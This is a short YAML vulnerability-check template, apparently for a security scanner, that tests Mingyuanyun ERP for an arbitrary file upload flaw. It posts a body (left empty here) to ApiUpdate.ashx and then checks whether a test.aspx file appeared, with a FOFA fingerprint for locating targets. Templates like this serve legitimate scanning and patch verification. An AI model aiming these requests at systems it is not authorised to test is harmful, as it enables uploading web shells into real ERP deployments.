id: poc-yaml-mingyuanyun-erp-apiupdate-anyfile-upload
info:
  name: 明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 明源云ERP
  fofa: 接口管家站点正常
variables:
  hexbody: hex_decode("")
requests:
- method: POST
  path: /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a
  data: '{{.hexbody}}'
  expression: 'status_code == 200 &&

    contains(body,"Message\":\"OK")

    '
- method: GET
  path: /fdccloud/_/test.aspx
  expression: 'status_code == 200 &&

    contains(body,"TestVuln")

    '
transport: http
